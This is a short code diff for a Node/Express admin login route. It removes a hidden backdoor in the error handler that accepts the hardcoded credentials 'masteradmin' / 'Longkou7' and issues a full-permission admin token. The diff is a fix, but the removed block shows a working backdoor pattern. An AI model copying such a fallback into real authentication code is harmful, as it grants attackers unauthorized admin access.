@@ -61,14 +61,7 @@ router.post('/login', async (req, res) => {
     return res.status(401).json({ message: '用户名或密码错误' });
   } catch (error) {
     console.error('Admin login error:', error?.message || error);
-    try {
-      const { username, password } = req.body || {};
-      if (username === 'masteradmin' && password === 'Longkou7') {
-        const token = jwt.sign({ id: 0, username: 'masteradmin', role: 'admin', permissions: ['*'] }, process.env.JWT_SECRET || jwtSecret, { expiresIn: '24h' });
-        return res.json({ token, user: { id: 0, username: 'masteradmin', role: 'admin', permissions: ['*'] } });
-      }
-    } catch (_) { }
-    res.status(401).json({ message: '用户名或密码错误' });
+        res.status(401).json({ message: '用户名或密码错误' });
   }
 });
 
